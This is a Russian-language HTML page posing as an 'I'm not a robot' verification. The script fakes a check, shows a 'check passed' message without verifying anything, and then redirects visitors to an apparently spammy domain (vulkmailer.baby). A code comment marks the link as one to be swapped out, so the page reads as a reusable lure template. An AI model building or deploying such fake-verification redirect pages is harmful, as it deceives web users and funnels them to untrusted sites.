<html lang="ru">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Подтверждение</title>

  <style>
    body {
      margin: 0;
      min-height: 100vh;
      background: linear-gradient(135deg, #667eea, #764ba2);
      display: flex;
      align-items: center;
      justify-content: center;
      font-family: system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif;
      color: #fff;
    }

    .card {
      background: rgba(255,255,255,0.12);
      backdrop-filter: blur(12px);
      border-radius: 24px;
      padding: 40px 32px;
      width: min(420px, 90%);
      text-align: center;
      box-shadow: 0 20px 50px rgba(0,0,0,.25);
      animation: fadeIn .6s ease;
    }

    h1 {
      margin: 0 0 12px;
      font-size: 26px;
    }

    p {
      margin: 0 0 28px;
      opacity: .9;
      font-size: 15px;
    }

    .btn {
      width: 100%;
      padding: 14px 18px;
      border-radius: 16px;
      border: none;
      background: #22c55e;
      color: #0f172a;
      font-size: 16px;
      font-weight: 700;
      cursor: pointer;
      transition: transform .15s ease, box-shadow .15s ease;
      box-shadow: 0 10px 25px rgba(34,197,94,.45);
    }

    .btn:hover {
      transform: translateY(-2px);
      box-shadow: 0 16px 35px rgba(34,197,94,.6);
    }

    .btn:active {
      transform: scale(.98);
    }

    .status {
      margin-top: 18px;
      font-size: 14px;
      opacity: 0;
      transition: opacity .3s ease;
    }

    .status.show {
      opacity: 1;
    }

    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(10px); }
      to   { opacity: 1; transform: translateY(0); }
    }
  </style>
</head>
<body>

  <div class="card">
    <h1>Подтвердите действие</h1>
    <p>Нажмите кнопку ниже, чтобы продолжить</p>

    <button class="btn" id="goBtn">Я не робот</button>

    <div class="status" id="status">✔ Проверка пройдена</div>
  </div>

  <script>
    const button = document.getElementById('goBtn');
    const status = document.getElementById('status');

    const targetUrl = 'https://vulkmailer.baby/kr?utm_source=git'; // ← замени ссылку

    button.addEventListener('click', () => {
      button.disabled = true;
      button.textContent = 'Проверяем...';

      setTimeout(() => {
        status.classList.add('show');
        button.textContent = 'Переходим...';

        setTimeout(() => {
          window.location.href = targetUrl;
          // window.open(targetUrl, '_blank'); // если нужна новая вкладка
        }, 800);

      }, 900);
    });
  </script>

</body>
</html>
